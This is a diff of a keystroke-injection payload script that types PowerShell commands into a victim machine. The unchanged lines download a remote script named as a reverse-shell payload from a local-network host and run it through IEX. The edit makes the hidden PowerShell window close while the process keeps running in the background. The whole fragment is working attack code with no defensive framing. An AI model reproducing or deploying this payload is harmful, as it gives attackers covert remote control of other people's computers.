@@ -43,8 +43,6 @@ Enter
 STRING $Process = IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.5/meterman-64.ps1')
 REM Download, execute powershell reverseshell payload, and store in $Process
 ENTER
-STRING Start-Job -ScriptBlock{$Process}
-REM Start job process in the background
-ENTER
 STRING powershell -windowstyle hidden $Process 
-REM Close Powershell 
+REM Close Powershell window, keeping process open in the background
+ENTER
